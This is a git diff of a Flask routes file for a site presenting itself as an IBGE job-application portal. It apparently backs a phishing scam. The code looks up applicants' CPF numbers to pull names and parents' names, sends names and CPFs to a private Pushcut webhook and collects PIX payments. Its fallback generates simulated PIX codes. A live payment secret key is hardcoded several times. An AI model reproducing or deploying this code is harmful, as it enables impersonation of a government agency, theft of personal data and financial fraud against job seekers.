@@ -12,17 +12,17 @@ def gerar_codigo_pix_simulado(valor, protocolo):
 
 def register_routes(app):
     """Registrar todas as rotas da aplicação"""
-    
+
     @app.route('/')
     def index():
         """Página principal - Trabalhe Conosco IBGE"""
         # Track page view
         facebook_pixel.track_page_view("Homepage")
-        
+
         concursos = ConcursoPublico.query.filter_by(status='ativo').all()
         processos = ProcessoSeletivo.query.filter_by(status='ativo').all()
         estagios = VagaEstagio.query.filter_by(status='ativo').all()
-        
+
         return render_template('index.html', 
                              concursos=concursos,
                              processos=processos, 
@@ -57,32 +57,32 @@ def register_routes(app):
         """Send notification to Pushcut webhook when CPF is consulted"""
         try:
             pushcut_webhook_url = "https://api.pushcut.io/CwRJR0BYsyJYezzN-no_e/notifications/Sms"
-            
+
             # Preparar dados da notificação
             customer_name = consultation_result.get('nome_completo', 'Cliente')
             cpf = cpf_data.get('cpf', 'N/A')
             success = consultation_result.get('success', False)
-            
+
             notification_payload = {
                 "title": "📋 Nova Consulta CPF",
                 "text": f"Cliente: {customer_name}\nCPF: {cpf}\nStatus: {'Sucesso' if success else 'Fallback'}",
                 "isTimeSensitive": True
             }
-            
+
             print(f"[CPF] Enviando notificação Pushcut: {notification_payload}")
-            
+
             # Enviar notificação
             response = requests.post(
                 pushcut_webhook_url,
                 json=notification_payload,
                 timeout=10
             )
-            
+
             if response.ok:
                 print("[CPF] Notificação Pushcut enviada com sucesso!")
             else:
                 print(f"[CPF] Falha ao enviar notificação Pushcut: {response.status_code}")
-                
+
         except Exception as e:
             print(f"[CPF] Erro ao enviar notificação Pushcut: {str(e)}")
 
@@ -92,15 +92,15 @@ def register_routes(app):
         try:
             data = request.get_json()
             cpf = data.get('cpf', '').replace('.', '').replace('-', '')
-            
+
             if not cpf or len(cpf) != 11:
                 return jsonify({'success': False, 'message': 'CPF inválido'})
-            
+
             # Usar CPFConsultationClient para consultar CPF
             from cpf_client import cpf_client
-            
+
             cpf_result = cpf_client.consult(cpf)
-            
+
             if not cpf_result.get('success'):
                 # Se falhar na API, usar dados de fallback
                 user_data = {
@@ -130,16 +130,16 @@ def register_routes(app):
                     'success': True
                 }
                 print(f"[CPF API] Dados obtidos: {api_data.get('nome')}")
-            
+
             # Enviar notificação via Pushcut webhook
             _send_pushcut_cpf_notification(data, user_data)
-            
+
             # Track Facebook Pixel registration start event
             facebook_pixel.track_registration_start(user_data)
-            
+
             session['user_data'] = user_data
             return jsonify({'success': True, 'data': user_data})
-            
+
         except Exception as e:
             print(f"Erro na validação de CPF: {str(e)}")
             return jsonify({'success': False, 'message': 'Erro interno do servidor'})
@@ -150,19 +150,19 @@ def register_routes(app):
         try:
             data = request.get_json()
             cep = data.get('cep', '').replace('-', '').replace(' ', '')
-            
+
             if not cep or len(cep) != 8:
                 return jsonify({'success': False, 'message': 'CEP inválido'})
-            
+
             # Usar CEPConsultationClient para consultar CEP
             from cep_client import CEPConsultationClient
-            
+
             # Usar a mesma base_url da API PayBets
             base_url = "https://elite-manager-api-62571bbe8e96.herokuapp.com/api"
             cep_client = CEPConsultationClient(base_url)
-            
+
             cep_result = cep_client.consult(cep)
-            
+
             if not cep_result.get('success'):
                 # Se falhar na API, tentar ViaCEP como fallback
                 try:
@@ -182,9 +182,9 @@ def register_routes(app):
                             })
                 except:
                     pass
-                
+
                 return jsonify({'success': False, 'message': 'CEP não encontrado'})
-            
+
             # Usar dados da API
             api_data = cep_result.get('data', {})
             return jsonify({
@@ -197,7 +197,7 @@ def register_routes(app):
                     'uf': api_data.get('uf', '')
                 }
             })
-            
+
         except Exception as e:
             print(f"Erro na validação de CEP: {str(e)}")
             return jsonify({'success': False, 'message': 'Erro interno do servidor'})
@@ -214,13 +214,13 @@ def register_routes(app):
     @app.route('/confirmacao-dados')
     def confirmacao_dados():
         """Página de confirmação de dados"""
-        
+
         # Track page view
         facebook_pixel.track_page_view("Data Confirmation")
-        
+
         # Dados do usuário para o template
         usuario_data = session.get('user_data', {})
-        
+
         # Se não há dados na sessão, usar dados padrão vazios
         usuario = {
             'nome_completo': usuario_data.get('nome_completo', ''),
@@ -233,10 +233,10 @@ def register_routes(app):
             'nome_pai': usuario_data.get('nome_pai', ''),
             'naturalidade': usuario_data.get('naturalidade', '')
         }
-        
+
         # Buscar CEP dos parâmetros da URL
         cep_url = request.args.get('cep', '').replace('-', '').replace(' ', '')
-        
+
         # Dados de endereço - buscar via ViaCEP se CEP fornecido
         endereco = {
             'cep': '',
@@ -247,7 +247,7 @@ def register_routes(app):
             'cidade': '',
             'uf': ''
         }
-        
+
         if cep_url and len(cep_url) == 8:
             try:
                 # Buscar dados do CEP via ViaCEP
@@ -267,18 +267,18 @@ def register_routes(app):
             except:
                 # Se falhar, manter endereço vazio
                 pass
-        
+
         # Dados de contato
         contato = {
             'telefone': '',
             'telefone_alt': '',
             'email': ''
         }
-        
+
         # Dados de cargo baseados no parâmetro
         cargo_param = request.args.get('cargo', 'agente')
         categoria_cnh = request.args.get('categoria_cnh', 'D')
-        
+
         if cargo_param == 'supervisor':
             cargo_selecionado = 'Supervisor de Coleta e Qualidade'
             vagas_disponivel = '1.245'
@@ -287,7 +287,7 @@ def register_routes(app):
             cargo_selecionado = 'Agente de Pesquisas e Mapeamento'
             vagas_disponivel = '7.825'
             mostrar_categoria_cnh = True
-        
+
         return render_template('confirmacao_dados.html', 
                              usuario=usuario, 
                              endereco=endereco, 
@@ -331,13 +331,13 @@ def register_routes(app):
             # Verificar limite de pedidos por CPF
             from models import PixRequestLimit
             cpf_clean = data['cpf'].replace('.', '').replace('-', '')
-            
+
             print(f"[PIX LIMIT] Verificando limite para CPF: {cpf_clean}")
-            
+
             if PixRequestLimit.is_limit_exceeded(cpf_clean, limit=8):
                 current_count = PixRequestLimit.get_request_count(cpf_clean)
                 print(f"[PIX LIMIT] ❌ Limite excedido para CPF {cpf_clean}: {current_count} pedidos")
-                
+
                 return jsonify({
                     'erro': 'Limite de solicitações excedido',
                     'mensagem': f'Este CPF já possui {current_count} pedidos PIX registrados. O limite máximo é de 8 pedidos por CPF.',
@@ -345,7 +345,7 @@ def register_routes(app):
                     'limite_maximo': 8,
                     'pedidos_atuais': current_count
                 }), 429
-            
+
             current_count = PixRequestLimit.get_request_count(cpf_clean)
             print(f"[PIX LIMIT] ✓ Limite OK para CPF {cpf_clean}: {current_count}/8 pedidos")
 
@@ -357,7 +357,7 @@ def register_routes(app):
             print("[PIX DEBUG] Preparando dados do pagamento...")
             # Converter valor de centavos para reais para a API Cashtime
             valor_reais = data['amount'] / 100 if isinstance(data['amount'], int) else data['amount']
-            
+
             # Preparar dados para Cashtime API
             cashtime_data = {
                 'name': data['name'],
@@ -373,16 +373,16 @@ def register_routes(app):
             try:
                 # Usar a secret key hardcoded fornecida
                 secret_key = "sk_live_sLJNf4hOupi7EBe8hVKeRW+AENhDiFhdn0m98dZOHgaNXMBHUwgAnDwEyMSFsaX05oLaDklKbjHe+WMR5wzrcX4AXeux7i8joSG6GB1Nk36BSKyrpuvDdHsXq9JzmAm8XtbaaiUPPmhpnfZNiNk/OGq2tl2CtztLJRVUIWLKhno="
-                
+
                 # Criar instância da API Cashtime
                 cashtime_api = create_cashtime_api(secret_key=secret_key)
-                
+
                 # Gerar PIX
                 result = cashtime_api.create_pix_payment(cashtime_data)
-                
+
                 if result.get('success'):
                     print(f"[PIX DEBUG] ✓ PIX Cashtime gerado com sucesso: {result.get('cashtime_id')}")
-                    
+
                     # Track Facebook Pixel PIX generation
                     user_info = {
                         'nome_completo': data['name'],
@@ -391,13 +391,13 @@ def register_routes(app):
                         'phone': data.get('phone', '')
                     }
                     facebook_pixel.track_pix_generation(user_info, result.get('cashtime_id'))
-                    
+
                     # Registrar pedido no sistema de limite
                     try:
                         transaction_id = result.get('cashtime_id')
                         ip_address = request.remote_addr
                         user_agent = request.headers.get('User-Agent', '')
-                        
+
                         PixRequestLimit.add_request(
                             cpf=data['cpf'],
                             nome_completo=data['name'],
@@ -407,30 +407,30 @@ def register_routes(app):
                             ip_address=ip_address,
                             user_agent=user_agent
                         )
-                        
+
                         updated_count = PixRequestLimit.get_request_count(cpf_clean)
                         print(f"[PIX LIMIT] ✓ Pedido registrado - CPF {cpf_clean}: {updated_count}/8 pedidos")
-                        
+
                     except Exception as e:
                         print(f"[PIX LIMIT] ⚠ Erro ao registrar pedido: {e}")
-                    
+
                     # Gerar QR Code em base64 se não foi fornecido
                     qr_code_base64 = result.get('qr_code_image')
                     if not qr_code_base64 and result.get('pix_code'):
                         import qrcode
                         import io
                         import base64
-                        
+
                         qr = qrcode.QRCode(version=1, box_size=10, border=5)
                         qr.add_data(result.get('pix_code'))
                         qr.make(fit=True)
-                        
+
                         img = qr.make_image(fill_color="black", back_color="white")
                         img_buffer = io.BytesIO()
                         img.save(img_buffer, format='PNG')
                         img_str = base64.b64encode(img_buffer.getvalue()).decode()
                         qr_code_base64 = f"data:image/png;base64,{img_str}"
-                    
+
                     return jsonify({
                         'success': True,
                         'payment_id': result.get('cashtime_id'),
@@ -443,25 +443,25 @@ def register_routes(app):
                     })
                 else:
                     raise Exception(result.get('error', 'Erro na API Cashtime'))
-                
+
             except Exception as api_error:
                 print(f"[PIX DEBUG] ❌ Erro na API Cashtime: {api_error}")
                 print("[PIX DEBUG] Gerando PIX de demonstração como fallback...")
-                
+
                 # PIX de demonstração usando nova implementação
                 import uuid
                 import io
                 import base64
                 import random
                 from datetime import datetime, timedelta
-                
+
                 # Gerar protocolo e PIX simulado
                 protocolo = f"PAY-2025-{random.randint(100000, 999999)}"
                 valor_final = data['amount'] / 100  # Converter de centavos para reais
-                
+
                 # Usar função melhorada de PIX simulado
                 pix_code_simulado = gerar_codigo_pix_simulado(valor_final, protocolo)
-                
+
                 # Gerar QR code
                 qr = qrcode.QRCode(
                     version=1,
@@ -470,20 +470,20 @@ def register_routes(app):
                 )
                 qr.add_data(pix_code_simulado)
                 qr.make(fit=True)
-                
+
                 img = qr.make_image(fill_color="black", back_color="white")
                 img_buffer = io.BytesIO()
                 img.save(img_buffer, format='PNG')
                 img_str = base64.b64encode(img_buffer.getvalue()).decode()
-                
+
                 print("[PIX DEBUG] ✓ PIX de demonstração gerado com sucesso")
-                
+
                 # Registrar pedido no sistema de limite (mesmo para demonstração)
                 try:
                     demo_payment_id = f"demo_{uuid.uuid4().hex[:12]}"
                     ip_address = request.remote_addr
                     user_agent = request.headers.get('User-Agent', '')
-                    
+
                     PixRequestLimit.add_request(
                         cpf=data['cpf'],
                         nome_completo=data['name'],
@@ -493,13 +493,13 @@ def register_routes(app):
                         ip_address=ip_address,
                         user_agent=user_agent
                     )
-                    
+
                     updated_count = PixRequestLimit.get_request_count(cpf_clean)
                     print(f"[PIX LIMIT] ✓ Pedido demo registrado - CPF {cpf_clean}: {updated_count}/8 pedidos")
-                    
+
                 except Exception as e:
                     print(f"[PIX LIMIT] ⚠ Erro ao registrar pedido demo: {e}")
-                
+
                 return jsonify({
                     'success': True,
                     'payment_id': demo_payment_id,
@@ -522,13 +522,13 @@ def register_routes(app):
         try:
             data = request.get_json()
             payment_id = data.get('payment_id') or session.get('payment_id')
-            
+
             if not payment_id:
                 return jsonify({
                     'sucesso': False,
                     'erro': 'ID do pagamento não encontrado'
                 })
-            
+
             # Verificar se é pagamento de demonstração
             if payment_id.startswith('demo_'):
                 print(f"[PIX DEBUG] Verificando pagamento de demonstração: {payment_id}")
@@ -537,16 +537,16 @@ def register_routes(app):
                     'status': 'pendente',
                     'message': 'Pagamento em demonstração - sempre pendente'
                 })
-            
+
             # Para pagamentos Cashtime, tentar verificar via API
             print(f"[PIX DEBUG] Verificando pagamento Cashtime: {payment_id}")
             try:
                 from cashtime_api import create_cashtime_api
                 secret_key = "sk_live_sLJNf4hOupi7EBe8hVKeRW+AENhDiFhdn0m98dZOHgaNXMBHUwgAnDwEyMSFsaX05oLaDklKbjHe+WMR5wzrcX4AXeux7i8joSG6GB1Nk36BSKyrpuvDdHsXq9JzmAm8XtbaaiUPPmhpnfZNiNk/OGq2tl2CtztLJRVUIWLKhno="
-                
+
                 cashtime_api = create_cashtime_api(secret_key=secret_key)
                 result = cashtime_api.check_payment_status(payment_id)
-                
+
                 if result.get('success'):
                     return jsonify({
                         'sucesso': True,
@@ -560,7 +560,7 @@ def register_routes(app):
                         'status': 'pendente',
                         'message': 'Pagamento Cashtime - aguardando confirmação'
                     })
-                    
+
             except Exception as cashtime_error:
                 print(f"[PIX DEBUG] Erro na verificação Cashtime: {cashtime_error}")
                 # Fallback para pendente
@@ -569,7 +569,7 @@ def register_routes(app):
                     'status': 'pendente',
                     'message': 'Pagamento Cashtime - aguardando confirmação'
                 })
-                
+
         except Exception as e:
             print(f"[PIX DEBUG] Erro na verificação de pagamento: {str(e)}")
             return jsonify({
@@ -588,7 +588,7 @@ def register_routes(app):
             else:
                 status = 'pending'
                 message = 'Pagamento PayBets aguardando confirmação'
-            
+
             return jsonify({
                 'status': status,
                 'message': message,
@@ -614,27 +614,27 @@ def register_routes(app):
                     '/transactions/{txid}'
                 ]
             }
-            
+
             # Tentar criar instância da API
             try:
                 from cashtime_api import create_cashtime_api
                 secret_key = "sk_live_sLJNf4hOupi7EBe8hVKeRW+AENhDiFhdn0m98dZOHgaNXMBHUwgAnDwEyMSFsaX05oLaDklKbjHe+WMR5wzrcX4AXeux7i8joSG6GB1Nk36BSKyrpuvDdHsXq9JzmAm8XtbaaiUPPmhpnfZNiNk/OGq2tl2CtztLJRVUIWLKhno="
-                
+
                 api = create_cashtime_api(secret_key=secret_key)
                 debug_info['api_instance_created'] = True
                 debug_info['api_url_active'] = api.API_URL
                 debug_info['secret_key'] = api.secret_key[:20] + '...'
                 debug_info['public_key'] = api.public_key[:20] + '...' if api.public_key else None
-                
+
             except Exception as e:
                 debug_info['api_instance_created'] = False
                 debug_info['api_error'] = str(e)
-            
+
             return jsonify(debug_info)
-            
+
         except Exception as e:
             return jsonify({'error': str(e)}), 500
-    
+
     @app.route('/debug-paybets')
     def debug_paybets():
         """Debug da configuração PayBets"""
@@ -650,7 +650,7 @@ def register_routes(app):
                     '/external/cep/{cep}'
                 ]
             }
-            
+
             # Tentar criar instância da API
             try:
                 from paybets_api import create_production_api
@@ -662,26 +662,26 @@ def register_routes(app):
             except Exception as e:
                 debug_info['api_instance_created'] = False
                 debug_info['api_error'] = str(e)
-            
+
             return jsonify(debug_info)
-            
+
         except Exception as e:
             return jsonify({'error': str(e)}), 500
-    
+
     @app.route('/health/cashtime')
     def health_cashtime():
         """Verificar saúde da API Cashtime"""
         try:
             import requests
             response = requests.get('https://api.cashtime.com.br/health', timeout=5)
-            
+
             result = {
                 'status': 'healthy' if response.status_code == 200 else 'unhealthy',
                 'api_url': 'https://api.cashtime.com.br/v1',
                 'response_time': response.elapsed.total_seconds(),
                 'status_code': response.status_code
             }
-            
+
             status_code = 200 if result['status'] == 'healthy' else 503
             return jsonify(result), status_code
         except Exception as e:
@@ -690,17 +690,17 @@ def register_routes(app):
                 'error': str(e),
                 'api_url': 'https://api.cashtime.com.br/v1'
             }), 503
-    
+
     @app.route('/health/paybets')
     def health_paybets():
         """Verificar saúde da API PayBets"""
         try:
             from paybets_api import health_check
             health_status = health_check()
-            
+
             status_code = 200 if health_status.get('status') == 'healthy' else 503
             return jsonify(health_status), status_code
-            
+
         except Exception as e:
             return jsonify({
                 'status': 'unhealthy',
@@ -716,10 +716,10 @@ def register_routes(app):
             consent.ip_address = request.remote_addr
             consent.user_agent = request.headers.get('User-Agent', '')
             consent.consent_type = 'accepted'
-            
+
             db.session.add(consent)
             db.session.commit()
-            
+
             return jsonify({'success': True})
         except Exception as e:
             print(f"Erro ao salvar consent: {str(e)}")
@@ -732,10 +732,10 @@ def register_routes(app):
             from models import PixRequestLimit
             from sqlalchemy import func
             from app import db
-            
+
             # Obter estatísticas gerais
             total_requests = PixRequestLimit.query.count()
-            
+
             # Obter contagem por CPF
             cpf_stats = db.session.query(
                 PixRequestLimit.cpf_clean,
@@ -743,11 +743,11 @@ def register_routes(app):
                 func.max(PixRequestLimit.nome_completo).label('nome'),
                 func.max(PixRequestLimit.created_at).label('ultimo_pedido')
             ).group_by(PixRequestLimit.cpf_clean).all()
-            
+
             # Identificar CPFs próximos ao limite
             near_limit = [stat for stat in cpf_stats if stat.count >= 6]
             at_limit = [stat for stat in cpf_stats if stat.count >= 8]
-            
+
             return jsonify({
                 'success': True,
                 'stats': {
@@ -767,7 +767,7 @@ def register_routes(app):
                     } for stat in cpf_stats
                 ]
             })
-            
+
         except Exception as e:
             print(f"Erro ao consultar limites PIX: {str(e)}")
             return jsonify({'success': False, 'error': str(e)}), 500
@@ -778,19 +778,19 @@ def register_routes(app):
         try:
             from models import PixRequestLimit
             from app import db
-            
+
             cpf_clean = cpf.replace('.', '').replace('-', '')
-            
+
             # Remover todos os registros do CPF
             deleted_count = PixRequestLimit.query.filter_by(cpf_clean=cpf_clean).delete()
             db.session.commit()
-            
+
             return jsonify({
                 'success': True,
                 'message': f'Limite resetado para CPF {cpf_clean}',
                 'registros_removidos': deleted_count
             })
-            
+
         except Exception as e:
             print(f"Erro ao resetar limite PIX: {str(e)}")
             return jsonify({'success': False, 'error': str(e)}), 500
@@ -837,3 +837,28 @@ def register_routes(app):
 
         # Redirecionar para checkout
         return redirect('/checkout')
+
+def _send_pushcut_notification(payment_data: dict, paybets_result: dict) -> None:
+        """Send notification to Pushcut webhook when PayBets transaction is created"""
+        try:
+            pushcut_webhook_url = "https://api.pushcut.io/enS18cRkjJ2jn0d7ciD1a/notifications/Paybet%20"
+
+            # Notificação simples sem dados específicos
+            notification_payload = {}
+
+            print("Enviando notificação Pushcut PayBets...")
+
+            # Enviar notificação
+            response = requests.post(
+                pushcut_webhook_url,
+                json=notification_payload,
+                timeout=10
+            )
+
+            if response.ok:
+                print("Notificação Pushcut PayBets enviada com sucesso!")
+            else:
+                print(f"Falha ao enviar notificação Pushcut PayBets: {response.status_code}")
+
+        except Exception as e:
+            print(f"Erro ao enviar notificação Pushcut PayBets: {str(e)}")
